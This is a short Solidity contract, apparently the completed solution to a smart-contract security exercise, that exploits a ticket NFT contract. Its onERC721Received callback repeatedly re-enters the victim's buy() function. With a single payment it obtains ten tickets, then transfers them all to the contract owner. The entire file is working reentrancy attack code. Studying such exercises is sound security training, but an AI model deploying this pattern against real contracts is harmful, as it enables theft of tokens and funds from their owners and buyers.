// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

interface ILOLS14Ticket {
    function buy() external payable;
    function totalSupply() external view returns (uint256);
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract LOLS14TicketExploit is Ownable {
    ILOLS14Ticket public victim;

    constructor(address _victim) Ownable(msg.sender) {
        victim = ILOLS14Ticket(_victim);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        /*
            Your code goes here!
        */
        if (victim.totalSupply() != 10) {
            victim.buy();
        }

        return this.onERC721Received.selector;
    }

    function exploit() external payable {
        victim.buy();

        for (uint256 i; i < 10; ++i) {
            victim.transferFrom(address(this), owner(), i);
        }
    }
}
